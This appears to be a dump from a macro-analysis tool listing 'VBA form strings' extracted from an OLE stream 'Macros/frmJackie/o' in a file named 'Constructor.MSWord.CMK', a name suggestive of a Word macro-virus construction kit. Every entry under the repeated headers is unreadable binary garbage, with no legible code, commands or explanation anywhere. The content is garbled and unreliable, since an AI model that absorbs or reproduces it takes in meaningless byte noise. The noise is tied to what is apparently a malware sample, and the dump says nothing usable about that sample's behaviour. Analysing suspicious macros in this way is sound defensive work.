VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�ĥ��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
V�+wՊ�iB�:Ԫ8�&\
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�l4�S��8
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�檚܊A�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
0S�婵H�ORP�'
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
_��Z��ȩ����2z��\
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�T�
JƑ��L��S���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�\Z"\��Ί�yܕ���ƒI"�������F��5o�6�v:��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
%;���y5)�R�����׏+G�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���	��'J�ҿȑ�P7�-c���kӨ곫�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
̐��&�&�]�Αq
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
0�8���Uʟ,50T
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
k9��t�~�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�+��|Km
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
0ۏ�Jx
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
\Ƨ���J�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�k=f�0B6���:X/�P+f������l�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ݷڵK��:����V46mQ
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�-��d�s\�h�̱�Y܀=�{��<;
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���{G� �+z���(�4�Zw���4�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
}*�m�M�5���֯
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Q�C�C`}+е
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Hl���n
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�^jљ
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�z�ט宧�J
�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�=>�J�-B�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��:���Oq\��-o3F�k���S��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
*S�ّ�E
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�p��g�����Ұ'�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�-S��B�z��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
D��VJ�:SY���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
fi�)T艥���H#�h,`�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
5
v:'���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�cND�Q�Iq��P���6H�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
`����Z^��\
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�濦O�kM$
QQ�!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�+ռ1�Yx�A��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Z��,"�|
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
c�����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�guy���^hz��,�(�q���W"^�./tw��	*�ٝ�k5���rу��W����?�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�rqں=S�W����/
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
C"�	N��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
X�NI�KJPm��؈ԌR
(��O,�~
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
X&���d���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

񏅃>0A�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
L���G���\8�dzX]!s��|��C�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
-�\�3
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����6+7��R�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�U͔q(T�=�^]IY�GB���	T�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
:������H�@3]X9^�����F�lĢ�+�>d(��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
T���i���9�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��i�M���6���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
K�Qlt
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
"!&+7/&)4)!"0A149;>>>%.DIC<H7=>;��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
;("(;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
R��$3br�	

-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
%&'()*456789:CDEFGHIJSTUVWXYZcdefghijstuvwxyz���������������������������������������������������������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
B����	#3R�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
$4�%�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
&'()*56789:CDEFGHIJSTUVWXYZcdefghijstuvwxyz��������������������������������������������������������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�(�u�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�V���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
 H�L*��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�J/�&6��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ƣi��t�,
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��I��J��݌�+�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
X𾩥jkk��l��;�Z
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
s��+��*U
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�x���
6��QEv:&��h�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��R�㾒�y@c
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
{�ꪓpWJ�T���"a������lߎ7c8Ϯ)��j:��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
O�aq,�rY
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
5�Tc�z�%����;e�~�<�ȱ
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���`1�YƳj�[F���N�3���ִ�;hnZ��@�U��&{0
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�O�\�+�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��[�=��e@�+"�O𷘃#�'��I;��Օ���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
� Ӣ�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�%�j�FC
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
]����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
=�V��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
`��8�j�pvQl�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Ԗ�Ǟ�]�Լ5���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���2��8q
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�M"�ϠZ��l�e�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
u��`�Q̲
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
EE\�`9�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
0��+r�w
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�$�s���+��(��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��G�������
���G��?f�ٗʉ�?�F�zv�5c�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�3_�_�+����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
	$��s
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
<��b�s
6>��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�
����"�o�7�s�K��Q]��_���YΡp4Ե�Q6���GO����U
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
[ɚ��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
F�ݨ�&
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�$�f۟�x6�@˾��!ێv�7��,��b�c�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��E4�Z[���tP�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
e��?tvQ�Vŷ�|2�/�{t��"Y
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
G�I��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��N��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
m[s��q�&8by[Ϲ�Qw
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�g�]>���
Aae=�ۙ�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
wc;FG��ȪqAw$�&�q ]���N��M���p01��<J��V��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�_�C|U���Xۖ���m�1�U�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ş�X��ވ-`_
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�6i �hEc�����8�+
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
mk�J�B��7,g
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��[��u�H
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�2��Q���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
UӞ��Ϙ������-����xS�M{a=���,7v���b
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�4�#�~
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���	��F�sn��*�u]�|�1�Y:%�ŭ֯kc�\��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
[��l�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
u��}�UՋ�7f��F*9-
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
c;T����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
l%�#Y� 6��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
@#��Ʃ�.��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�p3��b�?{��3[�ֈ���ĳ\5؁���pٜ�y�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�/����O�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����_=����ࢺ�ݒoS
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��m
��,.RX�6
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�W���Z&�.���k��+ǂ$��G
�yR�g�I�O
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�sqpn$���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
>��qʎ���a����q���Z3�п��Y�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ѱ�Mv������V{�+�;
-------------------------------------------------------------------------------
